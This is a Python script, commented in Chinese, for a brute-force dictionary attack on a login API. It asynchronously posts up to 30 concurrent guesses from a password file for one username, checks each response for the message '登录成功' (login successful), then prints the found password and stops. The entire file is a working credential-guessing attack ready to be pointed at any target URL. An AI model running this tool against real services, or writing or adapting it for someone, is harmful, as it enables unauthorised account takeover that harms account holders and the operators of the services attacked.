import asyncio
import aiohttp
import chardet

# API URL
url = "This is changed to your target API address"
#这里改为你的目标API地址

# 请求头部分
headers = {
    "Header": "Content"
}

# 用户名
username = input("输入测试账号：")

# 从文件中逐行读取密码
password_file = "passwords.txt"  # 这里是你的字典 以每行分割

# 并发数量限制
MAX_CONCURRENT_REQUESTS = 30  # 根据实际情况调整并发数量

# 全局标志，用于控制任务是否继续执行
login_success = False

async def fetch(session, password, semaphore, progress):
    global login_success
    async with semaphore:
        if login_success:
            return  # 如果已经登录成功，直接返回
        data = {
            "username_or_qq": username,
            "password": password
        }
        async with session.post(url, headers=headers, data=data) as response:
            result = await response.json()
            # 更新进度
            progress["current"] += 1
            # 提取并打印 'message' 字段
            message = result.get('message', 'No message field in response')
            #按实际情况修改
            if message == "登录成功":
                print(f"\n登录成功！密码: {password}")
                print(f"完整响应数据: {result}")
                login_success = True  # 设置登录成功标志
                print("\n#================END================#")
                for task in asyncio.all_tasks():
                    task.cancel()  # 取消所有未完成的任务
            else:
                print(f"\r进度: {progress['current']}/{progress['total']} | 尝试密码: {password} | 响应: {message}", end="")
            return result

async def main():
    global login_success
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    session = aiohttp.ClientSession()  # 显式创建 ClientSession
    try:
        tasks = []
        passwords = []
        with open(password_file, "rb") as file:
            raw_data = file.read()
            result = chardet.detect(raw_data)
            encoding = result['encoding']
            print(f"Detected encoding: {encoding}")
        
        with open(password_file, "r", encoding=encoding, errors="replace") as file:
            for password in file:
                password = password.strip()
                if password:  # 确保密码不为空
                    passwords.append(password)
        
        total_passwords = len(passwords)
        progress = {"current": 0, "total": total_passwords}
        
        async def process_password(password):
            await fetch(session, password, semaphore, progress)
        
        for password in passwords:
            task = asyncio.create_task(process_password(password))
            tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)  # 等待所有任务完成
        if not login_success:
            print("\n所有请求完成！\n")
            print("#================END================#")
    except asyncio.CancelledError:
        pass  # 忽略取消任务的异常
    finally:
        await session.close()  # 确保在所有任务完成后关闭 ClientSession

if __name__ == "__main__":
    asyncio.run(main())
